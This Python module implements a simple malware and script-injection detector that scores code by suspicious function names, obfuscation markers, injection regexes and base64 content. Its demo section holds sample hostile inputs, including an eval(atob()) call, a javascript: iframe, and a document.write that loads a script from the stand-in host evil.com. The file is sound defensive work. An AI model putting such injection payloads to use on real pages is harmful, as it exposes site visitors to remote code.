# src/threat_detection/malware_detector.py
"""
Malware and Suspicious Script Detection Module
Detects malicious scripts and suspicious code patterns
"""

import json
import re
import hashlib
from typing import Dict, List
from config.settings import DETECTION_CONFIG, DATA_DIR
from config.logger import SecurityLogger

logger = SecurityLogger.get_logger(__name__)

class MalwareDetector:
    """Detects malware and suspicious scripts"""
    
    def __init__(self):
        """Initialize malware detector with known signatures"""
        self.confidence_threshold = DETECTION_CONFIG['malware']['confidence_threshold']
        self.signatures = self._load_signatures()
        self.suspicious_patterns = self._init_suspicious_patterns()
        logger.info("MalwareDetector initialized")
    
    def _load_signatures(self) -> Dict:
        """Load malware signatures from database"""
        try:
            sig_file = DATA_DIR / "malware_signatures.json"
            if sig_file.exists():
                with open(sig_file, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Error loading signatures: {e}")
        
        # Default signatures
        return {
            "script_tags": ["eval", "exec", "system", "shell_exec"],
            "suspicious_functions": ["document.write", "window.location", "XMLHttpRequest"],
            "obfuscation_indicators": ["atob", "btoa", "String.fromCharCode"],
        }
    
    def _init_suspicious_patterns(self) -> Dict:
        """Initialize regex patterns for malware detection"""
        return {
            "javascript_eval": re.compile(r'\beval\s*\(', re.IGNORECASE),
            "iframe_injection": re.compile(r'<iframe[^>]*src=["\']?javascript:', re.IGNORECASE),
            "script_injection": re.compile(r'<script[^>]*>.*?</script>', re.IGNORECASE | re.DOTALL),
            "onclick_event": re.compile(r'onclick\s*=\s*["\']', re.IGNORECASE),
            "base64_encoded": re.compile(r'(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)', re.IGNORECASE),
        }
    
    def detect(self, code: str, source_type: str = "script") -> Dict:
        """
        Detect malicious patterns in code
        
        Args:
            code: Code or script content to analyze
            source_type: Type of source ('script', 'html', 'binary', etc.)
        
        Returns:
            Dict with threat assessment
        """
        try:
            if not code:
                return {
                    "is_malicious": False,
                    "confidence": 0.0,
                    "threat_level": "safe",
                    "reasons": ["Empty content"]
                }
            
            # Analyze code for threats
            threat_features = self._analyze_code(code, source_type)
            threat_score = self._calculate_threat_score(threat_features)
            
            is_malicious = threat_score >= self.confidence_threshold
            
            result = {
                "is_malicious": is_malicious,
                "confidence": min(threat_score, 1.0),
                "threat_level": "high" if is_malicious else "safe",
                "reasons": self._generate_reasons(threat_features),
                "code_hash": hashlib.sha256(code.encode()).hexdigest()[:8],
                "source_type": source_type,
            }
            
            logger.info(f"Malware detection - Source: {source_type} - Score: {threat_score:.2f}")
            return result
        
        except Exception as e:
            logger.error(f"Error in malware detection: {e}")
            return {
                "is_malicious": False,
                "confidence": 0.0,
                "threat_level": "unknown",
                "reasons": ["Error in detection"]
            }
    
    def _analyze_code(self, code: str, source_type: str) -> Dict:
        """Analyze code for malware indicators"""
        features = {
            "suspicious_functions": self._detect_suspicious_functions(code),
            "obfuscation_score": self._detect_obfuscation(code),
            "script_injection_score": self._detect_script_injection(code),
            "encoded_content_score": self._detect_encoded_content(code),
            "suspicious_keywords": self._detect_keywords(code),
        }
        return features
    
    def _detect_suspicious_functions(self, code: str) -> float:
        """Detect use of suspicious functions"""
        code_lower = code.lower()
        suspicious_funcs = self.signatures.get("suspicious_functions", [])
        
        found_count = sum(1 for func in suspicious_funcs if func.lower() in code_lower)
        return min(found_count * 0.2, 0.8)
    
    def _detect_obfuscation(self, code: str) -> float:
        """Detect code obfuscation attempts"""
        obfuscation_indicators = self.signatures.get("obfuscation_indicators", [])
        
        obfuscation_score = 0.0
        for indicator in obfuscation_indicators:
            if indicator.lower() in code.lower():
                obfuscation_score += 0.25
        
        return min(obfuscation_score, 0.8)
    
    def _detect_script_injection(self, code: str) -> float:
        """Detect script injection attempts"""
        score = 0.0
        
        # Check for iframe injection
        if self.suspicious_patterns['iframe_injection'].search(code):
            score += 0.7
        
        # Check for script tags
        if self.suspicious_patterns['script_injection'].search(code):
            score += 0.3
        
        # Check for onclick handlers
        if self.suspicious_patterns['onclick_event'].search(code):
            score += 0.2
        
        return min(score, 0.8)
    
    def _detect_encoded_content(self, code: str) -> float:
        """Detect encoded or compressed content"""
        # Count base64-like patterns
        base64_matches = self.suspicious_patterns['base64_encoded'].findall(code)
        
        if len(base64_matches) > 5:
            return 0.5
        return 0.0
    
    def _detect_keywords(self, code: str) -> float:
        """Detect malicious keywords"""
        script_tags = self.signatures.get("script_tags", [])
        code_lower = code.lower()
        
        keyword_count = sum(1 for tag in script_tags if tag.lower() in code_lower)
        return min(keyword_count * 0.15, 0.6)
    
    def _calculate_threat_score(self, features: Dict) -> float:
        """Calculate overall threat score"""
        scores = list(features.values())
        if not scores:
            return 0.0
        return sum(scores) / len(scores)
    
    def _generate_reasons(self, features: Dict) -> List[str]:
        """Generate human-readable threat reasons"""
        reasons = []
        
        if features['suspicious_functions'] > 0.3:
            reasons.append("Suspicious functions detected")
        if features['obfuscation_score'] > 0.3:
            reasons.append("Code obfuscation detected")
        if features['script_injection_score'] > 0.3:
            reasons.append("Script injection patterns found")
        if features['encoded_content_score'] > 0.3:
            reasons.append("Encoded/suspicious content detected")
        if features['suspicious_keywords'] > 0.3:
            reasons.append("Malicious keywords found")
        
        if not reasons:
            reasons.append("Code appears safe")
        
        return reasons

# Demo usage
if __name__ == "__main__":
    detector = MalwareDetector()
    
    test_scripts = [
        "console.log('Hello, world');",
        "eval(atob('c29tZWhpZGRlbmNvZGU='));",
        "<iframe src='javascript:alert(1)'></iframe>",
        "document.write('<script src=\"http://evil.com/malware.js\"></script>');",
    ]
    
    for i, script in enumerate(test_scripts):
        result = detector.detect(script, "script")
        print(f"\nScript {i+1}: {script[:50]}...")
        print(f"  Malicious: {result['is_malicious']}")
        print(f"  Confidence: {result['confidence']:.2f}")
        print(f"  Reasons: {result['reasons']}")
